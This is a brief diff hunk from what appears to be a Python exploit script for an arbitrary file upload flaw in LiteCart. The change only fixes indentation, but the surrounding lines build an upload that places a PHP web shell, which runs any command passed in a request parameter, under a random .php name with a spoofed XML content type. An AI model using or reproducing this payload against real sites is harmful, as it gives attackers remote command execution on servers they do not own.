@@ -60,8 +60,8 @@ class LitecartAFU:
         filename = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
         files = {
             'vqmod' : (filename + ".php", "<?php if( isset( $_REQUEST['cmd'] ) ) { system( $_REQUEST['cmd'] . ' 2>&1' ); } ?>", "application/xml"),
-        'token' : token,
-        'upload' : (None, "Upload")
+            'token' : token,
+            'upload' : (None, "Upload")
         }
 
         try:
